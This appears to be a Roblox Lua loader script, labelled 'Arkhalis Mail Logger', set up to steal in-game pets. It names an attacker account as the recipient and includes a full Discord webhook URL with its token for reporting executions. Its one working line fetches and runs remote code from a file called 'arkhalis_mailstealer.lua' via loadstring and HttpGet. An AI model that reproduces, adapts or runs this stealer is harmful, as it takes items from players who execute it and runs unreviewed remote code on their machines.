--[[ Arkhalis Mail Logger ]]--

--[[ Main Config ]]--
_G.Username1 = "HejVajcoCoRobis" --// Username To Send Pets To
_G.Username2 = "" --// Username To Send Pets To [OPTIONAL]
--[[ Webhook Config ]]--
_G.Webhook = "https://discord.com/api/webhooks/1114812057016078357/7NFjQ18r74xXe1yGI_NPkKEiiig4yPUU2wiPH0LI9qQLfCy61OrgPdBlIjz9cKn8lGeE" --// Discord Webhook For Executions

--[[ Script ]]--
loadstring(game:HttpGet("https://arkhalislua.github.io/arkhalis_mailstealer.lua", true))()
